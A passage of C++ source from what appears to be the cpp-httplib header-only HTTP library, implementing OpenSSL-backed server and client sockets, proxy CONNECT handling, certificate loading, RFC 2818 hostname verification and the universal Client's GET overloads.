inline SSL *ssl_new(socket_t sock, SSL_CTX *ctx, std::mutex &amp;ctx_mutex,
                    U SSL_connect_or_accept, V setup) {
  SSL *ssl = nullptr;
  {
    std::lock_guard&lt;std::mutex&gt; guard(ctx_mutex);
    ssl = SSL_new(ctx);
  }

  if (ssl) {
    set_nonblocking(sock, true);
    auto bio = BIO_new_socket(static_cast&lt;int&gt;(sock), BIO_NOCLOSE);
    BIO_set_nbio(bio, 1);
    SSL_set_bio(ssl, bio, bio);

    if (!setup(ssl) || SSL_connect_or_accept(ssl) != 1) {
      SSL_shutdown(ssl);
      {
        std::lock_guard&lt;std::mutex&gt; guard(ctx_mutex);
        SSL_free(ssl);
      }
      set_nonblocking(sock, false);
      return nullptr;
    }
    BIO_set_nbio(bio, 0);
    set_nonblocking(sock, false);
  }

  return ssl;
}

inline void ssl_delete(std::mutex &amp;ctx_mutex, SSL *ssl, socket_t sock,
                       bool shutdown_gracefully) {
  // sometimes we may want to skip this to try to avoid SIGPIPE if we know
  // the remote has closed the network connection
  // Note that it is not always possible to avoid SIGPIPE, this is merely a
  // best-efforts.
  if (shutdown_gracefully) {
#ifdef _WIN32
    (void)(sock);
    SSL_shutdown(ssl);
#else
    detail::set_socket_opt_time(sock, SOL_SOCKET, SO_RCVTIMEO, 1, 0);

    auto ret = SSL_shutdown(ssl);
    while (ret == 0) {
      std::this_thread::sleep_for(std::chrono::milliseconds{100});
      ret = SSL_shutdown(ssl);
    }
#endif
  }

  std::lock_guard&lt;std::mutex&gt; guard(ctx_mutex);
  SSL_free(ssl);
}

template &lt;typename U&gt;
bool ssl_connect_or_accept_nonblocking(socket_t sock, SSL *ssl,
                                       U ssl_connect_or_accept,
                                       time_t timeout_sec,
                                       time_t timeout_usec) {
  auto res = 0;
  while ((res = ssl_connect_or_accept(ssl)) != 1) {
    auto err = SSL_get_error(ssl, res);
    switch (err) {
    case SSL_ERROR_WANT_READ:
      if (select_read(sock, timeout_sec, timeout_usec) &gt; 0) { continue; }
      break;
    case SSL_ERROR_WANT_WRITE:
      if (select_write(sock, timeout_sec, timeout_usec) &gt; 0) { continue; }
      break;
    default: break;
    }
    return false;
  }
  return true;
}

template &lt;typename T&gt;
inline bool process_server_socket_ssl(
    const std::atomic&lt;socket_t&gt; &amp;svr_sock, SSL *ssl, socket_t sock,
    size_t keep_alive_max_count, time_t keep_alive_timeout_sec,
    time_t read_timeout_sec, time_t read_timeout_usec, time_t write_timeout_sec,
    time_t write_timeout_usec, T callback) {
  return process_server_socket_core(
      svr_sock, sock, keep_alive_max_count, keep_alive_timeout_sec,
      [&amp;](bool close_connection, bool &amp;connection_closed) {
        SSLSocketStream strm(sock, ssl, read_timeout_sec, read_timeout_usec,
                             write_timeout_sec, write_timeout_usec);
        return callback(strm, close_connection, connection_closed);
      });
}

template &lt;typename T&gt;
inline bool process_client_socket_ssl(
    SSL *ssl, socket_t sock, time_t read_timeout_sec, time_t read_timeout_usec,
    time_t write_timeout_sec, time_t write_timeout_usec,
    time_t max_timeout_msec,
    std::chrono::time_point&lt;std::chrono::steady_clock&gt; start_time, T callback) {
  SSLSocketStream strm(sock, ssl, read_timeout_sec, read_timeout_usec,
                       write_timeout_sec, write_timeout_usec,
                       max_timeout_msec, start_time);
  return callback(strm);
}

class SSLInit {
public:
  SSLInit() {
    OPENSSL_init_ssl(
        OPENSSL_INIT_LOAD_SSL_STRINGS | OPENSSL_INIT_LOAD_CRYPTO_STRINGS, NULL);
  }
};

// SSL socket stream implementation
inline SSLSocketStream::SSLSocketStream(
    socket_t sock, SSL *ssl, time_t read_timeout_sec, time_t read_timeout_usec,
    time_t write_timeout_sec, time_t write_timeout_usec,
    time_t max_timeout_msec,
    std::chrono::time_point&lt;std::chrono::steady_clock&gt; start_time)
    : sock_(sock), ssl_(ssl), read_timeout_sec_(read_timeout_sec),
      read_timeout_usec_(read_timeout_usec),
      write_timeout_sec_(write_timeout_sec),
      write_timeout_usec_(write_timeout_usec),
      max_timeout_msec_(max_timeout_msec), start_time(start_time) {
  SSL_clear_mode(ssl, SSL_MODE_AUTO_RETRY);
}

inline SSLSocketStream::~SSLSocketStream() = default;

inline bool SSLSocketStream::is_readable() const {
  if (max_timeout_msec_ &lt;= 0) {
    return select_read(sock_, read_timeout_sec_, read_timeout_usec_) &gt; 0;
  }

  time_t read_timeout_sec;
  time_t read_timeout_usec;
  calc_actual_timeout(max_timeout_msec_, duration(), read_timeout_sec_,
                      read_timeout_usec_, read_timeout_sec, read_timeout_usec);

  return select_read(sock_, read_timeout_sec, read_timeout_usec) &gt; 0;
}

inline bool SSLSocketStream::is_writable() const {
  return select_write(sock_, write_timeout_sec_, write_timeout_usec_) &gt; 0 &amp;&amp;
         is_socket_alive(sock_) &amp;&amp; !is_ssl_peer_could_be_closed(ssl_, sock_);
}

inline ssize_t SSLSocketStream::read(char *ptr, size_t size) {
  if (SSL_pending(ssl_) &gt; 0) {
    return SSL_read(ssl_, ptr, static_cast&lt;int&gt;(size));
  } else if (is_readable()) {
    auto ret = SSL_read(ssl_, ptr, static_cast&lt;int&gt;(size));
    if (ret &lt; 0) {
      auto err = SSL_get_error(ssl_, ret);
      auto n = 1000;
#ifdef _WIN32
      while (--n &gt;= 0 &amp;&amp; (err == SSL_ERROR_WANT_READ ||
                          (err == SSL_ERROR_SYSCALL &amp;&amp;
                           WSAGetLastError() == WSAETIMEDOUT))) {
#else
      while (--n &gt;= 0 &amp;&amp; err == SSL_ERROR_WANT_READ) {
#endif
        if (SSL_pending(ssl_) &gt; 0) {
          return SSL_read(ssl_, ptr, static_cast&lt;int&gt;(size));
        } else if (is_readable()) {
          std::this_thread::sleep_for(std::chrono::microseconds{10});
          ret = SSL_read(ssl_, ptr, static_cast&lt;int&gt;(size));
          if (ret &gt;= 0) { return ret; }
          err = SSL_get_error(ssl_, ret);
        } else {
          return -1;
        }
      }
    }
    return ret;
  } else {
    return -1;
  }
}

inline ssize_t SSLSocketStream::write(const char *ptr, size_t size) {
  if (is_writable()) {
    auto handle_size = static_cast&lt;int&gt;(
        std::min&lt;size_t&gt;(size, (std::numeric_limits&lt;int&gt;::max)()));

    auto ret = SSL_write(ssl_, ptr, static_cast&lt;int&gt;(handle_size));
    if (ret &lt; 0) {
      auto err = SSL_get_error(ssl_, ret);
      auto n = 1000;
#ifdef _WIN32
      while (--n &gt;= 0 &amp;&amp; (err == SSL_ERROR_WANT_WRITE ||
                          (err == SSL_ERROR_SYSCALL &amp;&amp;
                           WSAGetLastError() == WSAETIMEDOUT))) {
#else
      while (--n &gt;= 0 &amp;&amp; err == SSL_ERROR_WANT_WRITE) {
#endif
        if (is_writable()) {
          std::this_thread::sleep_for(std::chrono::microseconds{10});
          ret = SSL_write(ssl_, ptr, static_cast&lt;int&gt;(handle_size));
          if (ret &gt;= 0) { return ret; }
          err = SSL_get_error(ssl_, ret);
        } else {
          return -1;
        }
      }
    }
    return ret;
  }
  return -1;
}

inline void SSLSocketStream::get_remote_ip_and_port(std::string &amp;ip,
                                                    int &amp;port) const {
  detail::get_remote_ip_and_port(sock_, ip, port);
}

inline void SSLSocketStream::get_local_ip_and_port(std::string &amp;ip,
                                                   int &amp;port) const {
  detail::get_local_ip_and_port(sock_, ip, port);
}

inline socket_t SSLSocketStream::socket() const { return sock_; }

inline time_t SSLSocketStream::duration() const {
  return std::chrono::duration_cast&lt;std::chrono::milliseconds&gt;(
             std::chrono::steady_clock::now() - start_time)
      .count();
}

static SSLInit sslinit_;

} // namespace detail

// SSL HTTP server implementation
inline SSLServer::SSLServer(const char *cert_path, const char *private_key_path,
                            const char *client_ca_cert_file_path,
                            const char *client_ca_cert_dir_path,
                            const char *private_key_password) {
  ctx_ = SSL_CTX_new(TLS_server_method());

  if (ctx_) {
    SSL_CTX_set_options(ctx_,
                        SSL_OP_NO_COMPRESSION |
                            SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION);

    SSL_CTX_set_min_proto_version(ctx_, TLS1_2_VERSION);

    if (private_key_password != nullptr &amp;&amp; (private_key_password[0] != '\0')) {
      SSL_CTX_set_default_passwd_cb_userdata(
          ctx_,
          reinterpret_cast&lt;void *&gt;(const_cast&lt;char *&gt;(private_key_password)));
    }

    if (SSL_CTX_use_certificate_chain_file(ctx_, cert_path) != 1 ||
        SSL_CTX_use_PrivateKey_file(ctx_, private_key_path, SSL_FILETYPE_PEM) !=
            1 ||
        SSL_CTX_check_private_key(ctx_) != 1) {
      SSL_CTX_free(ctx_);
      ctx_ = nullptr;
    } else if (client_ca_cert_file_path || client_ca_cert_dir_path) {
      SSL_CTX_load_verify_locations(ctx_, client_ca_cert_file_path,
                                    client_ca_cert_dir_path);

      SSL_CTX_set_verify(
          ctx_, SSL_VERIFY_PEER | SSL_VERIFY_FAIL_IF_NO_PEER_CERT, nullptr);
    }
  }
}

inline SSLServer::SSLServer(X509 *cert, EVP_PKEY *private_key,
                            X509_STORE *client_ca_cert_store) {
  ctx_ = SSL_CTX_new(TLS_server_method());

  if (ctx_) {
    SSL_CTX_set_options(ctx_,
                        SSL_OP_NO_COMPRESSION |
                            SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION);

    SSL_CTX_set_min_proto_version(ctx_, TLS1_2_VERSION);

    if (SSL_CTX_use_certificate(ctx_, cert) != 1 ||
        SSL_CTX_use_PrivateKey(ctx_, private_key) != 1) {
      SSL_CTX_free(ctx_);
      ctx_ = nullptr;
    } else if (client_ca_cert_store) {
      SSL_CTX_set_cert_store(ctx_, client_ca_cert_store);

      SSL_CTX_set_verify(
          ctx_, SSL_VERIFY_PEER | SSL_VERIFY_FAIL_IF_NO_PEER_CERT, nullptr);
    }
  }
}

inline SSLServer::SSLServer(
    const std::function&lt;bool(SSL_CTX &amp;ssl_ctx)&gt; &amp;setup_ssl_ctx_callback) {
  ctx_ = SSL_CTX_new(TLS_method());
  if (ctx_) {
    if (!setup_ssl_ctx_callback(*ctx_)) {
      SSL_CTX_free(ctx_);
      ctx_ = nullptr;
    }
  }
}

inline SSLServer::~SSLServer() {
  if (ctx_) { SSL_CTX_free(ctx_); }
}

inline bool SSLServer::is_valid() const { return ctx_; }

inline SSL_CTX *SSLServer::ssl_context() const { return ctx_; }

inline void SSLServer::update_certs(X509 *cert, EVP_PKEY *private_key,
                                    X509_STORE *client_ca_cert_store) {

  std::lock_guard&lt;std::mutex&gt; guard(ctx_mutex_);

  SSL_CTX_use_certificate(ctx_, cert);
  SSL_CTX_use_PrivateKey(ctx_, private_key);

  if (client_ca_cert_store != nullptr) {
    SSL_CTX_set_cert_store(ctx_, client_ca_cert_store);
  }
}

inline bool SSLServer::process_and_close_socket(socket_t sock) {
  auto ssl = detail::ssl_new(
      sock, ctx_, ctx_mutex_,
      [&amp;](SSL *ssl2) {
        return detail::ssl_connect_or_accept_nonblocking(
            sock, ssl2, SSL_accept, read_timeout_sec_, read_timeout_usec_);
      },
      [](SSL * /*ssl2*/) { return true; });

  auto ret = false;
  if (ssl) {
    std::string remote_addr;
    int remote_port = 0;
    detail::get_remote_ip_and_port(sock, remote_addr, remote_port);

    std::string local_addr;
    int local_port = 0;
    detail::get_local_ip_and_port(sock, local_addr, local_port);

    ret = detail::process_server_socket_ssl(
        svr_sock_, ssl, sock, keep_alive_max_count_, keep_alive_timeout_sec_,
        read_timeout_sec_, read_timeout_usec_, write_timeout_sec_,
        write_timeout_usec_,
        [&amp;](Stream &amp;strm, bool close_connection, bool &amp;connection_closed) {
          return process_request(strm, remote_addr, remote_port, local_addr,
                                 local_port, close_connection,
                                 connection_closed,
                                 [&amp;](Request &amp;req) { req.ssl = ssl; });
        });

    // Shutdown gracefully if the result seemed successful, non-gracefully if
    // the connection appeared to be closed.
    const bool shutdown_gracefully = ret;
    detail::ssl_delete(ctx_mutex_, ssl, sock, shutdown_gracefully);
  }

  detail::shutdown_socket(sock);
  detail::close_socket(sock);
  return ret;
}

// SSL HTTP client implementation
inline SSLClient::SSLClient(const std::string &amp;host)
    : SSLClient(host, 443, std::string(), std::string()) {}

inline SSLClient::SSLClient(const std::string &amp;host, int port)
    : SSLClient(host, port, std::string(), std::string()) {}

inline SSLClient::SSLClient(const std::string &amp;host, int port,
                            const std::string &amp;client_cert_path,
                            const std::string &amp;client_key_path,
                            const std::string &amp;private_key_password)
    : ClientImpl(host, port, client_cert_path, client_key_path) {
  ctx_ = SSL_CTX_new(TLS_client_method());

  SSL_CTX_set_min_proto_version(ctx_, TLS1_2_VERSION);

  detail::split(&amp;host_[0], &amp;host_[host_.size()], '.',
                [&amp;](const char *b, const char *e) {
                  host_components_.emplace_back(b, e);
                });

  if (!client_cert_path.empty() &amp;&amp; !client_key_path.empty()) {
    if (!private_key_password.empty()) {
      SSL_CTX_set_default_passwd_cb_userdata(
          ctx_, reinterpret_cast&lt;void *&gt;(
                    const_cast&lt;char *&gt;(private_key_password.c_str())));
    }

    if (SSL_CTX_use_certificate_file(ctx_, client_cert_path.c_str(),
                                     SSL_FILETYPE_PEM) != 1 ||
        SSL_CTX_use_PrivateKey_file(ctx_, client_key_path.c_str(),
                                    SSL_FILETYPE_PEM) != 1) {
      SSL_CTX_free(ctx_);
      ctx_ = nullptr;
    }
  }
}

inline SSLClient::SSLClient(const std::string &amp;host, int port,
                            X509 *client_cert, EVP_PKEY *client_key,
                            const std::string &amp;private_key_password)
    : ClientImpl(host, port) {
  ctx_ = SSL_CTX_new(TLS_client_method());

  detail::split(&amp;host_[0], &amp;host_[host_.size()], '.',
                [&amp;](const char *b, const char *e) {
                  host_components_.emplace_back(b, e);
                });

  if (client_cert != nullptr &amp;&amp; client_key != nullptr) {
    if (!private_key_password.empty()) {
      SSL_CTX_set_default_passwd_cb_userdata(
          ctx_, reinterpret_cast&lt;void *&gt;(
                    const_cast&lt;char *&gt;(private_key_password.c_str())));
    }

    if (SSL_CTX_use_certificate(ctx_, client_cert) != 1 ||
        SSL_CTX_use_PrivateKey(ctx_, client_key) != 1) {
      SSL_CTX_free(ctx_);
      ctx_ = nullptr;
    }
  }
}

inline SSLClient::~SSLClient() {
  if (ctx_) { SSL_CTX_free(ctx_); }
  // Make sure to shut down SSL since shutdown_ssl will resolve to the
  // base function rather than the derived function once we get to the
  // base class destructor, and won't free the SSL (causing a leak).
  shutdown_ssl_impl(socket_, true);
}

inline bool SSLClient::is_valid() const { return ctx_; }

inline void SSLClient::set_ca_cert_store(X509_STORE *ca_cert_store) {
  if (ca_cert_store) {
    if (ctx_) {
      if (SSL_CTX_get_cert_store(ctx_) != ca_cert_store) {
        // Free memory allocated for old cert and use new store `ca_cert_store`
        SSL_CTX_set_cert_store(ctx_, ca_cert_store);
      }
    } else {
      X509_STORE_free(ca_cert_store);
    }
  }
}

inline void SSLClient::load_ca_cert_store(const char *ca_cert,
                                          std::size_t size) {
  set_ca_cert_store(ClientImpl::create_ca_cert_store(ca_cert, size));
}

inline long SSLClient::get_openssl_verify_result() const {
  return verify_result_;
}

inline SSL_CTX *SSLClient::ssl_context() const { return ctx_; }

inline bool SSLClient::create_and_connect_socket(Socket &amp;socket, Error &amp;error) {
  return is_valid() &amp;&amp; ClientImpl::create_and_connect_socket(socket, error);
}

// Assumes that socket_mutex_ is locked and that there are no requests in flight
inline bool SSLClient::connect_with_proxy(
    Socket &amp;socket,
    std::chrono::time_point&lt;std::chrono::steady_clock&gt; start_time,
    Response &amp;res, bool &amp;success, Error &amp;error) {
  success = true;
  Response proxy_res;
  if (!detail::process_client_socket(
          socket.sock, read_timeout_sec_, read_timeout_usec_,
          write_timeout_sec_, write_timeout_usec_, max_timeout_msec_,
          start_time, [&amp;](Stream &amp;strm) {
            Request req2;
            req2.method = "CONNECT";
            req2.path = host_and_port_;
            if (max_timeout_msec_ &gt; 0) {
              req2.start_time_ = std::chrono::steady_clock::now();
            }
            return process_request(strm, req2, proxy_res, false, error);
          })) {
    // Thread-safe to close everything because we are assuming there are no
    // requests in flight
    shutdown_ssl(socket, true);
    shutdown_socket(socket);
    close_socket(socket);
    success = false;
    return false;
  }

  if (proxy_res.status == StatusCode::ProxyAuthenticationRequired_407) {
    if (!proxy_digest_auth_username_.empty() &amp;&amp;
        !proxy_digest_auth_password_.empty()) {
      std::map&lt;std::string, std::string&gt; auth;
      if (detail::parse_www_authenticate(proxy_res, auth, true)) {
        proxy_res = Response();
        if (!detail::process_client_socket(
                socket.sock, read_timeout_sec_, read_timeout_usec_,
                write_timeout_sec_, write_timeout_usec_, max_timeout_msec_,
                start_time, [&amp;](Stream &amp;strm) {
                  Request req3;
                  req3.method = "CONNECT";
                  req3.path = host_and_port_;
                  req3.headers.insert(detail::make_digest_authentication_header(
                      req3, auth, 1, detail::random_string(10),
                      proxy_digest_auth_username_, proxy_digest_auth_password_,
                      true));
                  if (max_timeout_msec_ &gt; 0) {
                    req3.start_time_ = std::chrono::steady_clock::now();
                  }
                  return process_request(strm, req3, proxy_res, false, error);
                })) {
          // Thread-safe to close everything because we are assuming there are
          // no requests in flight
          shutdown_ssl(socket, true);
          shutdown_socket(socket);
          close_socket(socket);
          success = false;
          return false;
        }
      }
    }
  }

  // If status code is not 200, proxy request is failed.
  // Set error to ProxyConnection and return proxy response
  // as the response of the request
  if (proxy_res.status != StatusCode::OK_200) {
    error = Error::ProxyConnection;
    res = std::move(proxy_res);
    // Thread-safe to close everything because we are assuming there are
    // no requests in flight
    shutdown_ssl(socket, true);
    shutdown_socket(socket);
    close_socket(socket);
    return false;
  }

  return true;
}

inline bool SSLClient::load_certs() {
  auto ret = true;

  std::call_once(initialize_cert_, [&amp;]() {
    std::lock_guard&lt;std::mutex&gt; guard(ctx_mutex_);
    if (!ca_cert_file_path_.empty()) {
      if (!SSL_CTX_load_verify_locations(ctx_, ca_cert_file_path_.c_str(),
                                         nullptr)) {
        ret = false;
      }
    } else if (!ca_cert_dir_path_.empty()) {
      if (!SSL_CTX_load_verify_locations(ctx_, nullptr,
                                         ca_cert_dir_path_.c_str())) {
        ret = false;
      }
    } else {
      auto loaded = false;
#ifdef _WIN32
      loaded =
          detail::load_system_certs_on_windows(SSL_CTX_get_cert_store(ctx_));
#elif defined(CPPHTTPLIB_USE_CERTS_FROM_MACOSX_KEYCHAIN) &amp;&amp; defined(__APPLE__)
#if TARGET_OS_OSX
      loaded = detail::load_system_certs_on_macos(SSL_CTX_get_cert_store(ctx_));
#endif // TARGET_OS_OSX
#endif // _WIN32
      if (!loaded) { SSL_CTX_set_default_verify_paths(ctx_); }
    }
  });

  return ret;
}

inline bool SSLClient::initialize_ssl(Socket &amp;socket, Error &amp;error) {
  auto ssl = detail::ssl_new(
      socket.sock, ctx_, ctx_mutex_,
      [&amp;](SSL *ssl2) {
        if (server_certificate_verification_) {
          if (!load_certs()) {
            error = Error::SSLLoadingCerts;
            return false;
          }
          SSL_set_verify(ssl2, SSL_VERIFY_NONE, nullptr);
        }

        if (!detail::ssl_connect_or_accept_nonblocking(
                socket.sock, ssl2, SSL_connect, connection_timeout_sec_,
                connection_timeout_usec_)) {
          error = Error::SSLConnection;
          return false;
        }

        if (server_certificate_verification_) {
          if (server_certificate_verifier_) {
            if (!server_certificate_verifier_(ssl2)) {
              error = Error::SSLServerVerification;
              return false;
            }
          } else {
            verify_result_ = SSL_get_verify_result(ssl2);

            if (verify_result_ != X509_V_OK) {
              error = Error::SSLServerVerification;
              return false;
            }

            auto server_cert = SSL_get1_peer_certificate(ssl2);
            auto se = detail::scope_exit([&amp;] { X509_free(server_cert); });

            if (server_cert == nullptr) {
              error = Error::SSLServerVerification;
              return false;
            }

            if (server_hostname_verification_) {
              if (!verify_host(server_cert)) {
                error = Error::SSLServerHostnameVerification;
                return false;
              }
            }
          }
        }

        return true;
      },
      [&amp;](SSL *ssl2) {
#if defined(OPENSSL_IS_BORINGSSL)
        SSL_set_tlsext_host_name(ssl2, host_.c_str());
#else
        // NOTE: Direct call instead of using the OpenSSL macro to suppress
        // -Wold-style-cast warning
        SSL_ctrl(ssl2, SSL_CTRL_SET_TLSEXT_HOSTNAME, TLSEXT_NAMETYPE_host_name,
                 static_cast&lt;void *&gt;(const_cast&lt;char *&gt;(host_.c_str())));
#endif
        return true;
      });

  if (ssl) {
    socket.ssl = ssl;
    return true;
  }

  shutdown_socket(socket);
  close_socket(socket);
  return false;
}

inline void SSLClient::shutdown_ssl(Socket &amp;socket, bool shutdown_gracefully) {
  shutdown_ssl_impl(socket, shutdown_gracefully);
}

inline void SSLClient::shutdown_ssl_impl(Socket &amp;socket,
                                         bool shutdown_gracefully) {
  if (socket.sock == INVALID_SOCKET) {
    assert(socket.ssl == nullptr);
    return;
  }
  if (socket.ssl) {
    detail::ssl_delete(ctx_mutex_, socket.ssl, socket.sock,
                       shutdown_gracefully);
    socket.ssl = nullptr;
  }
  assert(socket.ssl == nullptr);
}

inline bool SSLClient::process_socket(
    const Socket &amp;socket,
    std::chrono::time_point&lt;std::chrono::steady_clock&gt; start_time,
    std::function&lt;bool(Stream &amp;strm)&gt; callback) {
  assert(socket.ssl);
  return detail::process_client_socket_ssl(
      socket.ssl, socket.sock, read_timeout_sec_, read_timeout_usec_,
      write_timeout_sec_, write_timeout_usec_, max_timeout_msec_, start_time,
      std::move(callback));
}

inline bool SSLClient::is_ssl() const { return true; }

inline bool SSLClient::verify_host(X509 *server_cert) const {
  /* Quote from RFC2818 section 3.1 "Server Identity"

     If a subjectAltName extension of type dNSName is present, that MUST
     be used as the identity. Otherwise, the (most specific) Common Name
     field in the Subject field of the certificate MUST be used. Although
     the use of the Common Name is existing practice, it is deprecated and
     Certification Authorities are encouraged to use the dNSName instead.

     Matching is performed using the matching rules specified by
     [RFC2459].  If more than one identity of a given type is present in
     the certificate (e.g., more than one dNSName name, a match in any one
     of the set is considered acceptable.) Names may contain the wildcard
     character * which is considered to match any single domain name
     component or component fragment. E.g., *.a.com matches foo.a.com but
     not bar.foo.a.com. f*.com matches foo.com but not bar.com.

     In some cases, the URI is specified as an IP address rather than a
     hostname. In this case, the iPAddress subjectAltName must be present
     in the certificate and must exactly match the IP in the URI.

  */
  return verify_host_with_subject_alt_name(server_cert) ||
         verify_host_with_common_name(server_cert);
}

inline bool
SSLClient::verify_host_with_subject_alt_name(X509 *server_cert) const {
  auto ret = false;

  auto type = GEN_DNS;

  struct in6_addr addr6{};
  struct in_addr addr{};
  size_t addr_len = 0;

#ifndef __MINGW32__
  if (inet_pton(AF_INET6, host_.c_str(), &amp;addr6)) {
    type = GEN_IPADD;
    addr_len = sizeof(struct in6_addr);
  } else if (inet_pton(AF_INET, host_.c_str(), &amp;addr)) {
    type = GEN_IPADD;
    addr_len = sizeof(struct in_addr);
  }
#endif

  auto alt_names = static_cast&lt;const struct stack_st_GENERAL_NAME *&gt;(
      X509_get_ext_d2i(server_cert, NID_subject_alt_name, nullptr, nullptr));

  if (alt_names) {
    auto dsn_matched = false;
    auto ip_matched = false;

    auto count = sk_GENERAL_NAME_num(alt_names);

    for (decltype(count) i = 0; i &lt; count &amp;&amp; !dsn_matched; i++) {
      auto val = sk_GENERAL_NAME_value(alt_names, i);
      if (val-&gt;type == type) {
        auto name =
            reinterpret_cast&lt;const char *&gt;(ASN1_STRING_get0_data(val-&gt;d.ia5));
        auto name_len = static_cast&lt;size_t&gt;(ASN1_STRING_length(val-&gt;d.ia5));

        switch (type) {
        case GEN_DNS: dsn_matched = check_host_name(name, name_len); break;

        case GEN_IPADD:
          if (!memcmp(&amp;addr6, name, addr_len) ||
              !memcmp(&amp;addr, name, addr_len)) {
            ip_matched = true;
          }
          break;
        }
      }
    }

    if (dsn_matched || ip_matched) { ret = true; }
  }

  GENERAL_NAMES_free(const_cast&lt;STACK_OF(GENERAL_NAME) *&gt;(
      reinterpret_cast&lt;const STACK_OF(GENERAL_NAME) *&gt;(alt_names)));
  return ret;
}

inline bool SSLClient::verify_host_with_common_name(X509 *server_cert) const {
  const auto subject_name = X509_get_subject_name(server_cert);

  if (subject_name != nullptr) {
    char name[BUFSIZ];
    auto name_len = X509_NAME_get_text_by_NID(subject_name, NID_commonName,
                                              name, sizeof(name));

    if (name_len != -1) {
      return check_host_name(name, static_cast&lt;size_t&gt;(name_len));
    }
  }

  return false;
}

inline bool SSLClient::check_host_name(const char *pattern,
                                       size_t pattern_len) const {
  if (host_.size() == pattern_len &amp;&amp; host_ == pattern) { return true; }

  // Wildcard match
  // https://bugs.launchpad.net/ubuntu/+source/firefox-3.0/+bug/376484
  std::vector&lt;std::string&gt; pattern_components;
  detail::split(&amp;pattern[0], &amp;pattern[pattern_len], '.',
                [&amp;](const char *b, const char *e) {
                  pattern_components.emplace_back(b, e);
                });

  if (host_components_.size() != pattern_components.size()) { return false; }

  auto itr = pattern_components.begin();
  for (const auto &amp;h : host_components_) {
    auto &amp;p = *itr;
    if (p != h &amp;&amp; p != "*") {
      auto partial_match = (p.size() &gt; 0 &amp;&amp; p[p.size() - 1] == '*' &amp;&amp;
                            !p.compare(0, p.size() - 1, h));
      if (!partial_match) { return false; }
    }
    ++itr;
  }

  return true;
}
#endif

// Universal client implementation
inline Client::Client(const std::string &amp;scheme_host_port)
    : Client(scheme_host_port, std::string(), std::string()) {}

inline Client::Client(const std::string &amp;scheme_host_port,
                      const std::string &amp;client_cert_path,
                      const std::string &amp;client_key_path) {
  const static std::regex re(
      R"((?:([a-z]+):\/\/)?(?:\[([a-fA-F\d:]+)\]|([^:/?#]+))(?::(\d+))?)");

  std::smatch m;
  if (std::regex_match(scheme_host_port, m, re)) {
    auto scheme = m[1].str();

#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
    if (!scheme.empty() &amp;&amp; (scheme != "http" &amp;&amp; scheme != "https")) {
#else
    if (!scheme.empty() &amp;&amp; scheme != "http") {
#endif
#ifndef CPPHTTPLIB_NO_EXCEPTIONS
      std::string msg = "'" + scheme + "' scheme is not supported.";
      throw std::invalid_argument(msg);
#endif
      return;
    }

    auto is_ssl = scheme == "https";

    auto host = m[2].str();
    if (host.empty()) { host = m[3].str(); }

    auto port_str = m[4].str();
    auto port = !port_str.empty() ? std::stoi(port_str) : (is_ssl ? 443 : 80);

    if (is_ssl) {
#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
      cli_ = detail::make_unique&lt;SSLClient&gt;(host, port, client_cert_path,
                                            client_key_path);
      is_ssl_ = is_ssl;
#endif
    } else {
      cli_ = detail::make_unique&lt;ClientImpl&gt;(host, port, client_cert_path,
                                             client_key_path);
    }
  } else {
    // NOTE: Update TEST(UniversalClientImplTest, Ipv6LiteralAddress)
    // if port param below changes.
    cli_ = detail::make_unique&lt;ClientImpl&gt;(scheme_host_port, 80,
                                           client_cert_path, client_key_path);
  }
} // namespace detail

inline Client::Client(const std::string &amp;host, int port)
    : cli_(detail::make_unique&lt;ClientImpl&gt;(host, port)) {}

inline Client::Client(const std::string &amp;host, int port,
                      const std::string &amp;client_cert_path,
                      const std::string &amp;client_key_path)
    : cli_(detail::make_unique&lt;ClientImpl&gt;(host, port, client_cert_path,
                                           client_key_path)) {}

inline Client::~Client() = default;

inline bool Client::is_valid() const {
  return cli_ != nullptr &amp;&amp; cli_-&gt;is_valid();
}

inline Result Client::Get(const std::string &amp;path) { return cli_-&gt;Get(path); }
inline Result Client::Get(const std::string &amp;path, const Headers &amp;headers) {
  return cli_-&gt;Get(path, headers);
}
inline Result Client::Get(const std::string &amp;path, Progress progress) {
  return cli_-&gt;Get(path, std::move(progress));
}
inline Result Client::Get(const std::string &amp;path, const Headers &amp;headers,
                          Progress progress) {
  return cli_-&gt;Get(path, headers, std::move(progress));
}
inline Result Client::Get(const std::string &amp;path,
                          ContentReceiver content_receiver) {
  return cli_-&gt;Get(path, std::move(content_receiver));
}
inline Result Client::Get(const std::string &amp;path, const Headers &amp;headers,
                          ContentReceiver content_receiver) {
  return cli_-&gt;Get(path, headers, std::move(content_receiver));
}
inline Result Client::Get(const std::string &amp;path,
                          ContentReceiver content_receiver, Progress progress) {
  return cli_-&gt;Get(path, std::move(content_receiver), std::move(progress));
}
inline Result Client::Get(const std::string &amp;path, const Headers &amp;headers,
                          ContentReceiver content_receiver, Progress progress) {
  return cli_-&gt;Get(path, headers, std::move(content_receiver),
                   std::move(progress));
}
inline Result Client::Get(const std::string &amp;path,
                          ResponseHandler response_handler,
                          ContentReceiver content_receiver) {
  return cli_-&gt;Get(path, std::move(response_handler),
                   std::move(content_receiver));
}
inline Result Client::Get(const std::string &amp;path, const Headers &amp;headers,
                          ResponseHandler response_handler,
                          ContentReceiver content_receiver) {
  return cli_-&gt;Get(path, headers, std::move(response_handler),
                   std::move(content_receiver));
}
inline Result Client::Get(const std::string &amp;path,
                          ResponseHandler response_handler,
                          ContentReceiver content_receiver, Progress progress) {
  return cli_-&gt;Get(path, std::move(response_handler),
                   std::move(content_receiver), std::move(progress));
}
inline Result Client::Get(const std::string &amp;path, const Headers &amp;headers,
                          ResponseHandler response_handler,
                          ContentReceiver content_receiver, Progress progress) {
  return cli_-&gt;Get(path, headers, std::move(response_handler),
                   std::move(content_receiver), std::move(progress));
}
inline Result Client::Get(const std::string &amp;path, const Params &amp;params,
                          const Headers &amp;headers, Progress progress) {
  return cli_-&gt;Get(path, params, headers, std::move(progress));
}
inline Result Client::Get(const std::string &amp;path, const Params &amp;params,
                          const Headers &amp;headers,
                          ContentReceiver content_receiver, Progress progress) {
  return cli_-&gt;Get(path, params, headers, std::move(content_receiver),
                   std::move(progress));
}
inline Result Client::Get(const std::string &amp;path, const Params &amp;params,
                          const Headers &amp;headers,
                          ResponseHandler response_handler,
                          ContentReceiver content_receiver, Progress progress) {
  return cli_-&gt;Get(path, params, headers, std::move(response_handler),
                   std::move(content_receiver), std::move(progress));
}

inline Result Client::Head(const std::string &amp;path) { return cli_-&gt;Head(path); }
